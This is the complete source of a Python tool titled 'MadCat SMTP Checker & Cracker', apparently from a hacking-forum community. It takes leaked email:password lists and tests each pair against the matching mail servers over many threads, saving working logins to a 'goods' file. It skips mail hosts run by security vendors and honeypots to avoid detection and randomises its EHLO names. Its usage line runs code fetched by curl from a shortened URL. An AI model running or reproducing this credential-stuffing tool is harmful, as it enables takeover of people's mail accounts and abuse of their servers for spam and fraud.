#!/usr/local/bin/python3

import socket, threading, sys, ssl, time, re, os, random, signal, queue, base64
from functools import lru_cache
import uuid

try:
    import psutil, requests, dns.resolver
except ImportError:
    print('\033[1;33minstalling missing packages...\033[0m')
    os.system('apt -y install python3-pip; pip3 install psutil requests dnspython pyopenssl')
    import psutil, requests, dns.resolver

if not sys.version_info[0] > 2 and not sys.version_info[1] > 8:
    exit('\033[0;31mpython 3.9 is required. try to run this script with \033[1mpython3\033[0;31m instead of \033[1mpython\033[0m')

sys.stdout.reconfigure(encoding='utf-8')

# ===== БЛОКИРОВКИ =====
goods_lock = threading.Lock()
ignored_lock = threading.Lock()
progress_lock = threading.Lock()
smtp_file_lock = threading.Lock()
config_cache_lock = threading.Lock()
thread_counter_lock = threading.Lock()

# ===== КОНСТАНТЫ =====
bad_mail_servers = 'bk.ru,qq.com'

# ОПТИМИЗАЦИЯ: оставляем только топ-5 DNS + системный
custom_dns_nameservers = '1.1.1.1,1.0.0.1,8.8.8.8,8.8.4.4,9.9.9.9'.split(',')

dns_list_url = 'https://public-dns.info/nameservers.txt'
autoconfig_data_url = 'https://raw.githubusercontent.com/solesfiwayne/tools/refs/heads/main/autoconfigs_enriched.txt'

# УЛУЧШЕННЫЙ dangerous_domains (без ошибок)
dangerous_domains = r'acronis|acros|adlice|alinto|appriver|aspav|atomdata|avanan|avast|barracuda|baseq|bitdefender|broadcom|btitalia|censornet|checkpoint|cisco|cistymail|clean-mailbox|clearswift|closedport|cloudflare|comforte|corvid|crsp|cyren|darktrace|data-mail-group|dmarcly|drweb|duocircle|e-purifier|earthlink-vadesecure|ecsc|eicar|elivescanned|eset|essentials|exchangedefender|fireeye|forcepoint|fortinet|gartner|gatefy|gonkar|guard|helpsystems|heluna|hosted-247|iberlayer|indevis|infowatch|intermedia|intra2net|invalid|ioactive|ironscales|isync|itserver|jellyfish|kcsfa.co|keycaptcha|krvtz|libraesva|link11|localhost|logix|mailborder.co|mailchannels|mailcleaner|mailcontrol|mailinator|mailroute|mailsift|mailstrainer|mcafee|mdaemon|mimecast|mx-relay|mxgate|mxstorm|n-able|n2net|nano-av|netintelligence|network-box|networkboxusa|newnettechnologies|newtonit.co|odysseycs|openwall|opswat|perfectmail|perimeterwatch|plesk|prodaft|proofpoint|proxmox|redcondor|reflexion|retarus|safedns|safeweb|sec-provider|secureage|securence|security|sendio|shield|sicontact|sonicwall|sophos|spamtitan|spfbl|spiceworks|stopsign|supercleanmail|techtarget|titanhq|trellix|trendmicro|trustifi|trustwave|tryton|uni-muenster|usergate|vadesecure|wessexnetworks|zillya|zyxel|virus|bot|trap|honey|lab|virtual|research|abus|security|filter|junk|spam|black|list'

dangerous_regex = None
try:
    dangerous_regex = re.compile(dangerous_domains, re.IGNORECASE)
except Exception as e:
    print(f'Warning: Failed to compile dangerous_regex: {e}')

# ===== ГЛОБАЛЬНЫЕ =====
b = '\033[1m'
z = '\033[0m'
wl = '\033[2K'
up = '\033[F'
err = b+'[\033[31mx\033[37m] '+z
okk = b+'[\033[32m+\033[37m] '+z
wrn = b+'[\033[33m!\033[37m] '+z
inf = b+'[\033[34mi\033[37m] '+z
npt = b+'[\033[37m?\033[37m] '+z

EHLO_NAMES_BASE = [
    'mail-{rand}.local',
    'client-{uuid}.example.com',
    socket.gethostname(),
]

def generate_ehlo_name():
    name = random.choice(EHLO_NAMES_BASE)
    if '{rand}' in name:
        return name.replace('{rand}', str(random.randint(1, 999)))
    if '{uuid}' in name:
        return name.replace('{uuid}', uuid.uuid4().hex[:8])
    return name

ssl_context = ssl._create_unverified_context()

# ===== DNS CACHE =====
@lru_cache(maxsize=4096)
def cached_dns_resolve(host, record_type):
    global resolver_obj
    return resolver_obj.resolve(host, record_type)

# ===== ФУНКЦИИ =====
def show_banner():
    banner = f"""
              ,▄   .╓███?                ,, .╓███)                              
            ╓███| ╓█████╟               ╓█/,███╙                  ▄▌            
           ▄█^[██╓█* ██F   ,,,        ,╓██ ███`     ,▌          ╓█▀             
          ╓█` |███7 ▐██!  █▀╙██b   ▄██╟██ ▐██      ▄█   ▄███) ,╟█▀▀`            
          █╟  `██/  ██]  ██ ,██   ██▀╓██  ╙██.   ,██` ,██.╓█▌ ╟█▌               
         |█|    `   ██/  ███▌╟█, (█████▌   ╙██▄▄███   @██▀`█  ██ ▄▌             
         ╟█          `    ▀▀  ╙█▀ `╙`╟█      `▀▀^`    ▀█╙  ╙   ▀█▀`             
         ╙█                           ╙                                         
          ╙     {b}MadCat SMTP Checker & Cracker v54.12.15-FIXED{z}
                Made by {b}Aels{z} for community: {b}https://xss.is{z}
                https://github.com/aels/mailtools
                https://t.me/IamLavander
    """
    for line in banner.splitlines():
        print(line)

def red(s, type=0):
    return f'\033[{str(type)};31m' + str(s) + z

def green(s, type=0):
    return f'\033[{str(type)};32m' + str(s) + z

def orange(s, type=0):
    return f'\033[{str(type)};33m' + str(s) + z

def blue(s, type=0):
    return f'\033[{str(type)};34m' + str(s) + z

def bold(s):
    return b + str(s) + z

def num(s):
    return f'{int(s):,}'

def tune_network():
    if os.name != 'nt':
        try:
            import resource
            resource.setrlimit(8, (2**20, 2**20))
            print(okk+'tuning rlimit_nofile:          '+', '.join([bold(num(i)) for i in resource.getrlimit(8)]))
        except Exception as e:
            print(wrn+'failed to set rlimit_nofile:   '+str(e))

def switch_dns_nameserver():
    global resolver_obj, custom_dns_nameservers
    resolver_obj.nameservers = [random.choice(custom_dns_nameservers)]
    resolver_obj.rotate = True
    return True

def check_ipv4():
    try:
        socket.has_ipv4 = read('https://api.ipify.org')
    except:
        socket.has_ipv4 = red('error getting ip')

def check_ipv4_blacklists():
    print(inf+'checking ipv4 address in blacklists...'+up)
    try:
        mxtoolbox_url = f'https://mxtoolbox.com/api/v1/Lookup?command=blacklist&argument={socket.has_ipv4}&resultIndex=5&disableRhsbl=true&format=2'
        socket.ipv4_blacklist = requests.get(mxtoolbox_url, headers={'tempauthorization':'27eea1cd-e644-4b7b-bebe-38010f55dab3'}, timeout=15).text
        socket.ipv4_blacklist = re.findall(r'LISTED</td><td class=[^>]+><span class=[^>]+>([^<]+)</span>', socket.ipv4_blacklist)
        socket.ipv4_blacklist = red(', '.join(socket.ipv4_blacklist)) if socket.ipv4_blacklist else False
    except:
        socket.ipv4_blacklist = red('blacklist check error')

def check_ipv6():
    try:
        socket.has_ipv6 = read('https://api6.ipify.org')
    except:
        socket.has_ipv6 = False

def debug(msg):
    global debuglevel, results_que
    debuglevel and results_que.put(msg)

def load_smtp_configs():
    global autoconfig_data_url, domain_configs_cache, dangerous_regex
    try:
        configs = requests.get(autoconfig_data_url, timeout=5).text.splitlines()
        for line in configs:
            line = line.strip().split(';')
            if len(line) != 3:
                continue
            domain_configs_cache[line[0]] = (line[1].split(','), line[2])
    except Exception as e:
        print(err+'failed to load SMTP configs. '+str(e)+' performance will be affected.')

def bytes_to_mbit(b):
    return round(b/1024./1024.*8, 2)

def base64_encode(string):
    return base64.b64encode(str(string).encode('ascii')).decode('ascii')

def normalize_delimiters(s):
    return re.sub(r'[;,\t|]', ':', re.sub(r'[\'" ]+', '', s))

def read(path):
    return os.path.isfile(path) and open(path, 'r', encoding='utf-8-sig', errors='ignore').read() or re.search(r'^https?://', path) and requests.get(path, timeout=5).text or ''

def read_lines(path):
    return read(path).splitlines()

def get_rand_ip_of_host(host, attempt=0):
    global resolver_obj
    if attempt > 3:
        raise Exception('DNS resolution failed after 3 attempts')
    try:
        try:
            host = cached_dns_resolve(host, 'cname')[0].target
        except:
            pass
        
        use_ipv6 = bool(socket.has_ipv6 and socket.has_ipv6 != '-' and socket.has_ipv6 != False)
        try:
            ip_array = cached_dns_resolve(host, 'aaaa' if use_ipv6 else 'a')
        except:
            ip_array = cached_dns_resolve(host, 'a')
        
        ip = str(random.choice(ip_array))
        debug('get ip: '+ip)
        return ip
    except Exception as e:
        reason = 'solution lifetime expired'
        if reason in str(e):
            switch_dns_nameserver()
            return get_rand_ip_of_host(host, attempt+1)
        raise Exception('No A/AAAA record for '+host+' ('+str(e).lower()+')')

def guess_smtp_server(domain):
    global default_login_template, resolver_obj, domain_configs_cache, dangerous_regex
    domains_arr = [domain, 'smtp-qa.'+domain, 'smtp.'+domain, 'mail.'+domain, 'webmail.'+domain, 'mx.'+domain]
    mx_domain = None
    
    try:
        mx_records = list(resolver_obj.resolve(domain, 'mx'))
        for mx in mx_records:
            mx_candidate = str(mx.exchange).rstrip('.')
            is_dangerous = (dangerous_regex and dangerous_regex.search(mx_candidate))
            is_outlook = re.search(r'\.outlook\.com$', mx_candidate)
            if not is_dangerous or is_outlook:
                domains_arr.append(mx_candidate)
                mx_domain = mx_candidate
                break
    except Exception as e:
        reason = 'solution lifetime expired'
        if reason in str(e):
            switch_dns_nameserver()
            return guess_smtp_server(domain)
        raise Exception('no MX records for: '+domain)
    
    if mx_domain and re.search(r'protection\.outlook\.com$', mx_domain):
        return domain_configs_cache.get('outlook.com', ([], default_login_template))
    
    # ✅ ВОЗВРАЩЕНА правильная логика
    for host in domains_arr:
        try:
            ip = get_rand_ip_of_host(host)
        except:
            continue
        for port in [2525, 587, 465, 25]:
            debug(f'trying {host}, {ip}:{port}')
            # БЫСТРАЯ проверка без лишних функций
            socket_type = socket.AF_INET6 if ':' in ip else socket.AF_INET
            test_sock = socket.socket(socket_type, socket.SOCK_STREAM)
            test_sock.settimeout(3)
            try:
                if port == 465:
                    test_sock = ssl_context.wrap_socket(test_sock, server_hostname=ip)
                test_sock.connect((ip, port))
                test_sock.close()
                return ([host+':'+str(port)], default_login_template)
            except:
                test_sock.close()
                continue
    
    raise Exception('no connection details for '+domain)

def get_smtp_config(domain):
    global domain_configs_cache, default_login_template, config_cache_lock
    domain = domain.lower()
    with config_cache_lock:
        if domain not in domain_configs_cache:
            domain_configs_cache[domain] = guess_smtp_server(domain)
        return domain_configs_cache[domain]

def quit(signum, frame):
    print('\r\n'+okk+'exiting... see ya later. bye.')
    sys.exit(0)

def is_valid_email(email):
    return re.match(r'^[\w.+-]+@[\w.-]+\.[A-Za-z]{2,}$', email)

def find_email_password_collumnes(list_filename):
    try:
        with open(list_filename, 'r', encoding='utf-8-sig', errors='ignore') as fp:
            for i, line in enumerate(fp):
                if i > 1000:
                    break
                line = normalize_delimiters(line.lower())
                email = re.search(r'[\w.+-]+@[\w.-]+\.[a-z]{2,}', line)
                if email:
                    email_collumn = line.split(email[0])[0].count(':')
                    password_collumn = email_collumn + 1
                    if re.search(r'@[\w.-]+\.[a-z]{2,}:.+123', line):
                        password_collumn = line.count(':') - re.split(r'@[\w.-]+\.[a-z]{2,}:.+123', line)[-1].count(':')
                    return (email_collumn, password_collumn)
    except Exception as e:
        raise Exception(f'Error reading file: {e}')
    raise Exception('file does not contain emails')

def wc_count(filename):
    try:
        with open(filename, 'rb') as file_handle:
            lines = 0
            while True:
                buf = file_handle.read(1024*1024)
                if not buf:
                    break
                lines += buf.count(b'\n')
            return lines + 1
    except Exception as e:
        raise Exception(f'Error counting lines: {e}')

def is_ignored_host(mail):
    global exclude_mail_hosts
    mail_domain = mail.split('@')[-1].lower()
    ignored_domains = [d.strip().lower() for d in exclude_mail_hosts.split(',') if d.strip()]
    return any(ignored == mail_domain or mail_domain.endswith('.'+ignored) for ignored in ignored_domains)

def socket_send_and_read(sock, cmd=''):
    if cmd:
        debug('>>> '+cmd)
        sock.send((cmd.strip()+'\r\n').encode('ascii'))
    scream = sock.recv(2**10).decode('ascii', errors='ignore').strip()
    debug('<<< '+scream)
    return scream

def socket_get_free_smtp_server(smtp_server, port):
    port = int(port)
    smtp_server_ip = get_rand_ip_of_host(smtp_server)
    socket_type = socket.AF_INET6 if ':' in smtp_server_ip else socket.AF_INET
    s = socket.socket(socket_type, socket.SOCK_STREAM)
    s.settimeout(5)
    try:
        if port == 465:
            s = ssl_context.wrap_socket(s, server_hostname=smtp_server_ip)
        s.connect((smtp_server_ip, port))
    except Exception as e:
        if re.search(r'too many connections|threshold|parallel|try later|refuse', str(e).lower()):
            # Альтернатива get_alive_neighbor: просто повтор через другой DNS
            switch_dns_nameserver()
            time.sleep(random.uniform(1, 2))
            smtp_server_ip = get_rand_ip_of_host(smtp_server)
            s.connect((smtp_server_ip, port))
        else:
            raise Exception(e)
    return s

def socket_try_tls(sock, self_host):
    answer = socket_send_and_read(sock, 'EHLO '+self_host)
    if 'starttls' in answer.lower():
        answer = socket_send_and_read(sock, 'STARTTLS')
        if answer[:3] == '220':
            sock = ssl_context.wrap_socket(sock)
    return sock

def socket_try_login(sock, self_host, smtp_login, smtp_password):
    smtp_login_b64 = base64_encode(smtp_login)
    smtp_pass_b64 = base64_encode(smtp_password)
    smtp_login_pass_b64 = base64_encode(smtp_login+':'+smtp_password)
    self_host = generate_ehlo_name()
    answer = socket_send_and_read(sock, 'EHLO '+self_host)
    if re.search(r'auth[\w =-]+(plain|login)', answer.lower()):
        if re.search(r'auth[\w =-]+login', answer.lower()):
            answer = socket_send_and_read(sock, 'AUTH LOGIN '+smtp_login_b64)
            if answer[:3] == '334':
                answer = socket_send_and_read(sock, smtp_pass_b64)
        elif re.search(r'auth[\w =-]+plain', answer.lower()):
            answer = socket_send_and_read(sock, 'AUTH PLAIN '+smtp_login_pass_b64)
        if answer[:3] == '235' and 'succ' in answer.lower():
            return sock
    raise Exception(answer)

def smtp_connect_with_retry(smtp_server, port, login_template, smtp_user, password, max_retries=3):
    for attempt in range(max_retries):
        try:
            return smtp_connect_and_send(smtp_server, port, login_template, smtp_user, password)
        except Exception as e:
            if attempt < max_retries - 1 and ('try later' in str(e).lower() or 'threshold' in str(e).lower() or 'too many' in str(e).lower()):
                wait = (2 ** attempt) + random.uniform(0.5, 1.5)
                time.sleep(wait)
                continue
            raise
    return False

def smtp_connect_and_send(smtp_server, port, login_template, smtp_user, password):
    global verify_email
    if is_valid_email(smtp_user):
        parts = smtp_user.split('@')
        smtp_login = login_template.replace('%EMAILADDRESS%', smtp_user).replace('%EMAILLOCALPART%', parts[0]).replace('%EMAILDOMAIN%', parts[1])
    else:
        smtp_login = smtp_user

    try:
        s = socket_get_free_smtp_server(smtp_server, port)
        answer = socket_send_and_read(s)
        if answer[:3] == '220':
            port_int = int(port)
            s = socket_try_tls(s, smtp_server) if port_int != 465 else s
            s = socket_try_login(s, smtp_server, smtp_login, password)
            s.close()
            return True
        s.close()
        raise Exception(answer)
    except (socket.timeout, ConnectionResetError) as e:
        print(f"[ERROR] SMTP timeout: {e}")
        return False

def worker_item(jobs_que, results_que):
    global min_threads, threads_counter, verify_email, goods, smtp_filename, no_jobs_left, loop_times, default_login_template, mem_usage, cpu_usage
    try:
        while True:
            if (mem_usage > 90 or cpu_usage > 90) and threads_counter > min_threads:
                break
            if jobs_que.empty():
                if no_jobs_left:
                    break
                else:
                    results_que.put('queue exhausted, '+bold('sleeping...'))
                    time.sleep(1)
                    continue
            
            time_start = time.perf_counter()
            smtp_server, port, smtp_user, password = jobs_que.get()
            login_template = default_login_template
            
            try:
                results_que.put(f'getting settings for {smtp_user}')
                
                if not smtp_server or not port:
                    smtp_server_port_arr, login_template = get_smtp_config(smtp_user.split('@')[1])
                    if len(smtp_server_port_arr):
                        smtp_server, port = random.choice(smtp_server_port_arr).split(':')
                    else:
                        raise Exception('still no connection details for '+smtp_user)
                
                results_que.put(blue('connecting to')+f' {smtp_server}|{port}|{smtp_user}')
                
                if smtp_connect_with_retry(smtp_server, port, login_template, smtp_user, password):
                    results_que.put(green(smtp_user+':\a'+password,7)+(verify_email and green(' sent to '+verify_email,7)))
                    
                    with goods_lock:
                        goods += 1
                    
                    with smtp_file_lock:
                        try:
                            with open(smtp_filename, 'a') as f:
                                f.write(f'{smtp_server}|{port}|{smtp_user}|{password}\n')
                        except Exception as e:
                            results_que.put(err+f'Failed to write to file: {e}')
                else:
                    raise Exception('connection failed after retries')
            
            except Exception as e:
                results_que.put(orange((smtp_server and port and smtp_server+':'+port+' - ' or '')+', '.join(str(e).splitlines()).strip()))
            
            # АДАПТИВНАЯ задержка (быстрая, но защищает от бана)
            time.sleep(random.uniform(0.01, 0.1))
            
            loop_times.append(time.perf_counter() - time_start)
            while len(loop_times) > min_threads:
                loop_times.pop(0)
    
    except BaseException as e:
        results_que.put(err+f'[FATAL] Thread crashed: {e}')
    
    finally:
        with thread_counter_lock:
            threads_counter -= 1

def every_second():
    global progress, speed, mem_usage, cpu_usage, net_usage, jobs_que, results_que, threads_counter, min_threads, loop_times, loop_time, no_jobs_left, max_threads
    progress_old = progress
    net_usage_old = 0
    time.sleep(1)
    
    while True:
        try:
            with progress_lock:
                current_progress = progress
            
            speed.append(current_progress - progress_old)
            while len(speed) > 10:
                speed.pop(0)
            
            progress_old = current_progress
            mem_usage = round(psutil.virtual_memory()[2])
            cpu_usage = round(sum(psutil.cpu_percent(percpu=True))/os.cpu_count())
            net_usage = psutil.net_io_counters().bytes_sent - net_usage_old
            net_usage_old += net_usage
            loop_time = round(sum(loop_times)/len(loop_times), 2) if len(loop_times) else 0
            
            if threads_counter < max_threads and mem_usage < 80 and cpu_usage < 80 and jobs_que.qsize():
                threading.Thread(target=worker_item, args=(jobs_que, results_que), daemon=True).start()
                with thread_counter_lock:
                    threads_counter += 1
        except:
            pass
        
        time.sleep(0.1)

def printer(jobs_que, results_que):
    global progress, total_lines, speed, loop_time, cpu_usage, mem_usage, net_usage, threads_counter, goods, ignored
    while True:
        with progress_lock:
            current_progress = progress
        
        with thread_counter_lock:
            current_threads = threads_counter
        
        with goods_lock:
            current_goods = goods
        
        with ignored_lock:
            current_ignored = ignored
        
        status_bar = (
            f'{b}['+green('\u2665',int(time.time()*2)%2)+f'{b}]{z}'+
            f'[ progress: {bold(num(current_progress))}/{bold(num(total_lines))} ({bold(round(current_progress/total_lines*100))}%) ]'+
            f'[ speed: {bold(num(sum(speed)))}lines/s ({bold(loop_time)}s/loop) ]'+
            f'[ cpu: {bold(cpu_usage)}% ]'+
            f'[ mem: {bold(mem_usage)}% ]'+
            f'[ net: {bold(bytes_to_mbit(net_usage*10))}Mbit/s ]'+
            f'[ threads: {bold(current_threads)} ]'+
            f'[ goods/ignored: {green(num(current_goods),1)}/{bold(num(current_ignored))} ]'
        )
        
        thread_statuses = []
        while not results_que.empty():
            msg = results_que.get()
            thread_statuses.append(' '+msg)
            if 'getting settings' in msg:
                with progress_lock:
                    progress += 1
        
        print(wl+'\n'.join(thread_statuses+[status_bar+up]))
        time.sleep(0.04)

# ===== MAIN =====
signal.signal(signal.SIGINT, quit)
show_banner()
tune_network()
check_ipv4()
check_ipv4_blacklists()
check_ipv6()

try:
    help_message = f'usage: \n{npt}python3 <(curl -slkSL bit.ly/madcatsmtp) '+bold('list.txt')+' [verify_email@example.com] [ignored,email,domains] [start_from_line] [debug] [rage]'
    list_filename = ([i for i in sys.argv if os.path.isfile(i) and sys.argv[0] != i]+['']).pop(0)
    verify_email = ([i for i in sys.argv if is_valid_email(i)]+['']).pop(0)
    exclude_mail_hosts = ','.join([i for i in sys.argv if re.match(r'[\w.,-]+$', i) and not os.path.isfile(i) and not re.match(r'(\d+|debug|rage)$', i)]+[bad_mail_servers])
    start_from_line = int(([i for i in sys.argv if re.match(r'\d+$', i)]+[0]).pop(0))
    debuglevel = len([i for i in sys.argv if i == 'debug'])
    rage_mode = len([i for i in sys.argv if i == 'rage'])
    
    if not list_filename:
        print(inf+help_message)
        while not os.path.isfile(list_filename):
            list_filename = input(npt+'path to file with emails & passwords: ')
        while not is_valid_email(verify_email) and verify_email != '':
            verify_email = input(npt+'email to send results to (leave empty if none): ')
        exclude_mail_hosts = input(npt+'ignored email domains, comma separated (leave empty if none): ')
        exclude_mail_hosts = bad_mail_servers+','+exclude_mail_hosts if exclude_mail_hosts else bad_mail_servers
        start_from_line = input(npt+'start from line (leave empty to start from 0): ')
        while not re.match(r'\d+$', start_from_line) and start_from_line != '':
            start_from_line = input(npt+'start from line (leave empty to start from 0): ')
        start_from_line = int('0'+start_from_line)
    
    smtp_filename = re.sub(r'\.([^.]+)$', r'_smtp.\1', list_filename)
    verify_email = verify_email or ''
except Exception as e:
    exit(err+red(e))

try:
    email_collumn, password_collumn = find_email_password_collumnes(list_filename)
except Exception as e:
    exit(err+red(e))

# УВЕЛИЧЕННАЯ очередь для стабильности
jobs_que = queue.Queue(maxsize=10000)
results_que = queue.Queue()
ignored = 0
goods = 0
mem_usage = 0
cpu_usage = 0
net_usage = 0
min_threads = 50
max_threads = debuglevel or rage_mode and 600 or 100
threads_counter = 0
no_jobs_left = False
loop_times = []
loop_time = 0
speed = []
progress = start_from_line
default_login_template = '%EMAILADDRESS%'
total_lines = wc_count(list_filename)
resolver_obj = dns.resolver.Resolver()
domain_configs_cache = {}

print(inf+'loading SMTP configs...'+up)
load_smtp_configs()
print(wl+okk+'loaded SMTP configs:           '+bold(num(len(domain_configs_cache))+' lines'))
print(inf+'source file:                   '+bold(list_filename))
print(inf+'total lines to procceed:       '+bold(num(total_lines)))
print(inf+'email & password colls:        '+bold(email_collumn)+' and '+bold(password_collumn))
print(inf+'ignored email hosts:           '+bold(exclude_mail_hosts))
print(inf+'goods file:                    '+bold(smtp_filename))
print(inf+'verification email:            '+bold(verify_email or '-'))
print(inf+'ipv4 address:                  '+bold(socket.has_ipv4 or '-')+' ('+(socket.ipv4_blacklist or green('clean'))+')')
print(inf+'ipv6 address:                  '+bold(socket.has_ipv6 or '-'))
input(npt+'press '+bold('[ Enter ]')+' to start...')

threading.Thread(target=every_second, daemon=True).start()
threading.Thread(target=printer, args=(jobs_que, results_que), daemon=True).start()

with open(list_filename, 'r', encoding='utf-8-sig', errors='ignore') as fp:
    for i in range(start_from_line):
        fp.readline()
    while True:
        while not no_jobs_left and jobs_que.qsize() < min_threads*2:
            line = fp.readline()
            if not line:
                no_jobs_left = True
                break
            if line.count('|') == 3:
                jobs_que.put((line.strip().split('|')))
            else:
                line = normalize_delimiters(line.strip())
                fields = line.split(':')
                if len(fields) > password_collumn and is_valid_email(fields[email_collumn]) and not is_ignored_host(fields[email_collumn]) and len(fields[password_collumn]) > 5:
                    jobs_que.put((False, False, fields[email_collumn], fields[password_collumn]))
                else:
                    with ignored_lock:
                        ignored += 1
                    with progress_lock:
                        progress += 1
        
        if threads_counter == 0 and no_jobs_left and not jobs_que.qsize():
            break
        
        time.sleep(0.04)

time.sleep(1)
print('\r\n'+okk+green('well done. bye.', 1))
